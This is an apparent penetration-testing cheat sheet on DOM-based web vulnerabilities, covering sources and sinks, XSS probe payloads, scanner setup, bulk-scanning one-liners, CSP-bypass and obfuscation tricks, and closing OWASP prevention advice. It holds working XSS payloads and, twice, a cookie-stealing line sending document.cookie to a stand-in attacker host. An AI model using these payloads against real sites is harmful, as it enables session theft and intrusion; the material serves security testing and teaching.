# DOM‑Based Vulnerabilities

> Comprehensive methodology and one‑liner commands for detecting and exploiting DOM‑based vulnerabilities (DOM XSS, open redirect, JS injection, postMessage abuse, etc.), incorporating 2025–2026 trends (framework escapes, postMessage abuse, modern sinks like React dangerouslySetInnerHTML, CSP bypass chaining) and authoritative references (PortSwigger Web Security Academy, OWASP DOM‑based XSS Prevention Cheat Sheet, PayloadsAllTheThings).

DOM‑based vulnerabilities occur entirely client‑side: JavaScript takes attacker‑controllable data from a **source** and passes it unsafely to a **sink** that executes or renders it dynamically (e.g., `eval()`, `innerHTML`). No server reflection needed — payload lives in URL hash, referrer, etc.

## Methodology

### Targets & Sources to Hunt

**Sources** — attacker‑controllable data entry points in the browser:

- `location` family: `location.href`, `location.search`, `location.hash` (most common, #payload invisible to server)
- `document.URL`, `document.documentURI`
- `document.referrer` (phishable via crafted links)
- `window.name` (persistent across navigations in some cases)
- `postMessage` event data (from cross‑origin windows/frames)
- `sessionStorage` / `localStorage` (if populated from untrusted input)
- `document.cookie` (if parsed unsafely)
- Input fields / `innerText` / `value` read dynamically
- WebSocket / SSE messages
- `history.pushState` / `replaceState` manipulated data

**Inspect:** JavaScript files (minified or source maps) for dynamic DOM manipulation with untrusted data. Search for:

- `.innerHTML =`, `.outerHTML =`, `document.write(`
- `eval(`, `setTimeout(`, `setInterval(`, `Function(`
- jQuery: `$.html(`, `.append(`, `.prepend(`
- Frameworks: `dangerouslySetInnerHTML` (React), `v‑html` (Vue), `[innerHTML]` (Angular)

**Common vulnerable patterns:**

- Search/reflect functions using `location.hash.slice(1)`
- Error/404 handlers echoing `document.referrer`
- Analytics/tracking scripts parsing URL params unsafely
- SPA route handlers processing `window.location.pathname`

### Basic Probes (Start Here)

Append payloads to sources and observe execution:

- `#<script>alert(1)</script>`
- `?q=<img src=x onerror=alert(1)>`
- `javascript:alert(1)` (if sink allows scheme)
- `';alert(1);//` (for string‑breakout in JS)
- Use Burp to inject & watch dev tools console/elements tab

**Quick test vectors:**

- `location.hash`: `https://target.com/#<svg onload=alert(1)>`
- `document.referrer`: Craft link from evil.com → target.com (referrer poisoning)
- `postMessage`: If listener exists, send from iframe: `parent.postMessage('<img src=x onerror=alert(1)>', '*')`

Look for: alert popup, new element insertion, console errors, or behavior change.

### Common Sinks & Exploit Examples

Dangerous functions that can lead to execution/rendering:

| Sink | Danger Level | Example |
|------|--------------|---------|
| `eval()` | Critical | `eval(location.hash.slice(1))` |
| `innerHTML` / `outerHTML` | High | `document.getElementById('out').innerHTML = location.hash.slice(1);` |
| `document.write()` / `document.writeln()` | High | `document.write('<img src="' + document.referrer + '">');` |
| `$.html()` (jQuery) | High | `$('#output').html($.urlParam('q'));` |
| `setTimeout(string)` / `setInterval(string)` | Medium | `setTimeout('alert(' + document.referrer + ')', 1000)` |
| `new Function()` | Medium | `new Function('return ' + location.search.slice(3))();` |
| `location` assignment (open redirect) | Medium | `location.href = document.referrer` |
| `ReactDOM.render()` / `dangerouslySetInnerHTML` | High | React props misuse |
| `Vue v‑html` | High | Vue directive with unsanitized data |
| Angular `DomSanitizer` bypass | High | Bypass via `bypassSecurityTrustHtml` |

## Tool Installation & Setup

### Burp Suite DOM Invader Extension

- Install via Burp's BApp Store: **DOM Invader** (PortSwigger)
- Automatically detects sources/sinks, suggests payloads, and highlights vulnerable flows

### Burp Suite Scanner

- Active scanning with DOM XSS detection enabled

### XSStrike (with --dom flag)

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt
python3 xsstrike.py --url https://target.com/page?q=test --dom
```

### dalfox (DOM‑aware fuzzer)

```bash
go install github.com/hahwul/dalfox/v2@latest
dalfox url https://target.com/page?q=test --dom
```

### Grep / ripgrep for Static Analysis

```bash
# Search JS files for dangerous sinks
rg 'innerHTML|eval|document\.write' *.js
rg 'location\.(href|search|hash)|document\.(URL|referrer|cookie)' *.js
```

### Browser Dev Tools

- Sources tab search for sinks
- Console: monitor `postMessage` events, `MutationObserver`
- Network tab: confirm no server request with payload (pure DOM‑based)

## Testing Commands (One‑Liners)

### DOM XSS Detection via grep on Collected JS

```bash
# Scan downloaded JS files for common sinks
cat livejslinks.txt | xargs -I@ curl -s @ | grep -E "(document\.(location|URL|cookie|domain|referrer)|innerHTML|outerHTML|eval\(|\.write\(\)" | anew dom-sinks.txt
```

### Source Identification via Page‑Fetch

```bash
# Use page‑fetch to test URL hash payloads
cat https-subs.txt | httpx -silent -threads 300 | sed 's/$/#<img src=x onerror=alert(1)>/' | page-fetch -j 'document.body.innerHTML.includes("<img src=x onerror=alert(1)>") ? "[VULNERABLE]" : "[NOT VULNERABLE]"' | grep "VULNERABLE"
```

### postMessage Listener Detection

```bash
# Extract postMessage listeners from JS files
cat livejslinks.txt | xargs -I@ curl -s @ | grep -E "addEventListener\('message'|window\.addEventListener\('message'|onmessage\s*=" | anew postmessage-listeners.txt
```

### Referrer Poisoning Test

```bash
# Simulate referrer poisoning with curl
curl -H "Referer: https://evil.com/#<img src=x onerror=alert(1)>" https://target.com/vulnerable-page
```

### localStorage / sessionStorage Source Test

```bash
# Inject payload via JS console (manual) then trigger page
echo 'localStorage.setItem("payload", "<img src=x onerror=alert(1)>");' > inject.js
# Use browser automation (puppeteer) to execute and monitor
```

### Open Redirect via location.href Sink

```bash
# Test for DOM‑based open redirect
curl -s "https://target.com/redirect?url=javascript:alert(1)" | grep -E "location\.href|window\.location|document\.location" && echo "Potential DOM‑based open redirect"
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

### Framework Sandbox Escapes

- **AngularJS** classic `{{constructor.constructor('alert(1)')()}}`
- **React** `dangerouslySetInnerHTML` with SVG event handlers
- **Vue** `v‑html` combined with `{{}}` interpolation bypass
- **Modern frameworks**: prop injection via `__proto__` pollution (chained)

### CSP Bypass for DOM XSS

- `script‑src 'self'` → abuse trusted scripts with controllable parameters
- `style‑src 'unsafe‑inline'` → use `<style>@import...` with `javascript:` (historical)
- `data:` URIs in allowed directives
- Event handlers that bypass CSP: `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`
- Trusted Types bypass (if polyfilled weakly)

### postMessage Abuse

- Wildcard origin `*` in `postMessage` listeners
- Lack of origin validation → send malicious payload from attacker‑controlled iframe
- Use `iframe.contentWindow.postMessage(payload, '*')` from same‑origin iframe

### Encoding / Obfuscation

- JSFuck, JJencode, `String.fromCharCode`
- Template literals: ``${alert}``
- Unicode escapes: `\u0061\u006c\u0065\u0072\u0074(1)`

### No‑Alert PoCs for Stealth

- Cookie exfiltration: `fetch('https://attacker.com?cookie='+document.cookie)`
- Keylogger via `addEventListener('keypress', ...)`
- UI redressing (clickjacking) via DOM manipulation

### MutationObserver / Proxy Tricks

- Hook DOM mutations to detect when payload is injected
- Use `Proxy` to intercept property accesses on `window` or `document`

### Recent Exotic: Shadow DOM Piercing

- Older `::shadow` / `/deep/` selectors (deprecated) but may still work in custom elements
- Access shadow DOM via `element.shadowRoot`

## Detection & Verification

**Indicators of vulnerability:**

- Payload executes in console/alert
- Element tab shows injected HTML/JS
- Network tab: no server request with payload (confirms DOM‑based)
- Blind: use `fetch('https://attacker.com?cookie='+document.cookie)` for exfil

**Verification steps:**

1. Identify sources (`location.hash`, `document.referrer`, `postMessage`, etc.)
2. Trace data flow to sinks (`innerHTML`, `eval`, `location.href`)
3. Inject test payload and observe execution/rendering
4. Chain with other vulnerabilities (CSP bypass, postMessage) for maximum impact

## Prevention Guidance (OWASP Latest)

1. **Avoid dangerous sinks** — use `textContent`, `createTextNode`, `innerText` instead of `innerHTML`
2. **Sanitize / escape** — DOMPurify, Trusted Types (enforce policy)
3. **Context‑aware encoding** — never trust sources; validate & encode per sink
4. **CSP** — strict `script‑src 'self' 'nonce‑...'`; `trusted‑types`
5. **Safe defaults** — React auto‑escapes; opt‑in to dangerous features
6. **Input validation** — allow‑list for URL params/hashes
7. **postMessage** — strict origin check, structured data only
8. **Regular static analysis** — grep for sinks in CI/CD

## References

- **PortSwigger Web Security Academy** – [DOM‑based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- **PortSwigger DOM‑based vulnerabilities overview** – [DOM‑based](https://portswigger.net/web-security/dom-based)
- **OWASP Cheat Sheet Series** – [DOM‑based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- **PortSwigger XSS Cheat Sheet 2026 Edition** – [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- **PayloadsAllTheThings** – [DOM XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- **Recent write‑ups (2025–2026)** – postMessage, framework escapes, Trusted Types bypass (Intigriti, Medium bounties)
